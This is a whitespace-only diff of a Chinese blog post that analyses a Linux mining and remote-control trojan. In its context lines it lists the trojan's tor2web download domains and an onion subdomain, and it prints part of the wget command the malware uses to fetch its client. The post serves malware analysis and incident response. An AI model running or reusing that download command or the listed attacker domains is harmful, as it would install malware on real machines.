@@ -81,7 +81,6 @@ X11 server需要有一种途径来跟X11 client来进行沟通。 在网络上�
 ![20191219-trojan-06.png](https://hksanduo.github.io/images/20191219-trojan-06.png)
 
 通过判断 **/proc/木马进程id/io** 文件是否存在，如果不存在执行**X**函数从以下这些站点三级域名**trumps4c4ohxvq7o**下载int木马客户端
-
 * tor2web.io
 * 4tor.ml
 * onion.mn
@@ -93,6 +92,7 @@ X11 server需要有一种途径来跟X11 client来进行沟通。 在网络上�
 * onion.nz
 * onion.glass
 * tor2web.su
+
 下载木马客户端的用户名为当前时间的md5值，然后授权执行删除。
 具体使用wget或者curl请求下载int木马文件拼接案例语句如下：
 ```
@@ -103,8 +103,6 @@ wget -t1 -T10 -qU- --no-check-certificate trumps4c4ohxvq7o.onion.mn/int -O./e0ee
 使用`lsof`命令查看该进程相关信息，如果没有相关命令，请自行安装
 ![20191219-trojan-07.png](https://hksanduo.github.io/images/20191219-trojan-07.png)
 可以发现相应的远控客户端（/usr/bin/46e5166a46208402e09732a78526b5f0）已删除
-
-
 使用top我们可以发现，该挖矿木马的客户端的进程id为8391，
 ![20191219-trojan-08.png](https://hksanduo.github.io/images/20191219-trojan-08.png)
 
@@ -139,6 +137,5 @@ wget -t1 -T10 -qU- --no-check-certificate trumps4c4ohxvq7o.onion.mn/int -O./e0ee
 ## 参考内容
 * [http://blog.lujun9972.win/blog/2018/04/24/docker%E5%AE%B9%E5%99%A8%E4%B8%AD%E8%B7%91gui%E7%9A%84%E6%9C%80%E7%AE%80%E5%8D%95%E6%96%B9%E6%B3%95/index.html](http://blog.lujun9972.win/blog/2018/04/24/docker%E5%AE%B9%E5%99%A8%E4%B8%AD%E8%B7%91gui%E7%9A%84%E6%9C%80%E7%AE%80%E5%8D%95%E6%96%B9%E6%B3%95/index.html)【/tmp/.X11-unix=是什么玩意】
 * [https://unix.stackexchange.com/questions/196677/what-is-tmp-x11-unix](https://unix.stackexchange.com/questions/196677/what-is-tmp-x11-unix) 【what-is-tmp-x11-unix】
-## 参考
 * [https://dwheeler.com/flawfinder/](https://dwheeler.com/flawfinder/)【flawfinder官网】
 * [https://github.com/david-a-wheeler/flawfinder](https://github.com/david-a-wheeler/flawfinder)【github】
